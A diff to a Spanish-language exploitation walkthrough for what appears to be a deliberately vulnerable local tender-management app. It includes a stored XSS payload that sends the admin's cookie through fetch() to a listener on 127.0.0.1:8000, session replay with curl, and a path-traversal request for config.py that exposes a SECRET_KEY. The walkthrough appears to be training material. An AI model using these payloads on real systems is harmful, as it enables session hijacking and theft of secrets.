@@ -27,7 +27,7 @@
   2. Abrir una licitacion **abierta** y presentar una propuesta. Completar
      razon social, CUIT valido (ej. `20-33333333-3`) y monto valido (ej. `999`).
   3. En **Descripcion**, pegar un payload de robo de cookie como:
-     <script>fetch("http://localhost:8000/robo?c="+encodeURIComponent(document.cookie));</script>
+     <script>fetch("http://127.0.0.1:8000/robo?c="+encodeURIComponent(document.cookie));</script>
 - **Resultado esperado:** al guardarse, el script queda persistido. Cuando el
   admin abra esa licitacion, el codigo se ejecuta en **su** navegador.
 
@@ -44,9 +44,12 @@
   2. Con el XSS del paso 1 ya cargado, iniciar sesion como `admin` / `admin123`
      y abrir la licitacion afectada (`/admin/licitacion/<id>`).
   3. La cookie del admin aparece en el listener (parametro `?c=`).
+     - **Atencion:** 
+          - Inicio de cookie: Luego de **3D**
+          - Reemplazar: %3D%3D por **==**
   4. **Replay** de la cookie robada:
-     - **curl:** `curl -b "sesion=<VALOR_ROBADO>" http://localhost:5000/admin`
-     - **DevTools:** Application → Cookies → `http://localhost:5000` → editar la
+     - **curl:** `curl -b "sesion=<VALOR_ROBADO>" http://127.0.0.1:5000/admin`
+     - **DevTools:** Application → Cookies → `http://127.0.0.1:5000` → editar la
        cookie `sesion` con el valor robado → recargar.
 - **Resultado esperado:** navegas como administrador usando solo la cookie
   robada.
@@ -61,11 +64,11 @@
   (`os.path.join("reportes", nombre)` sin sanitizar).
 - **Como explotarla** (ya como admin, del paso 2):
   1. Descarga legitima de referencia:
-     `http://localhost:5000/admin/descargar?file=reporte_ejemplo.csv`
+     `http://127.0.0.1:5000/admin/descargar?file=reporte_ejemplo.csv`
   2. Escapar hacia el archivo de configuracion:
-     `http://localhost:5000/admin/descargar?file=../config.py`
+     `http://127.0.0.1:5000/admin/descargar?file=../config.py`
 - **Resultado esperado:** se obtiene `config.py`, incluida la
-  `SECRET_KEY = b"clave-super-secreta-ficticio-sa-2026"` y las credenciales de BD.
+  `SECRET_KEY = b"clave-super-secreta-ficticio-sa-2026"` y la ruta de la BD.
 
 ---
 
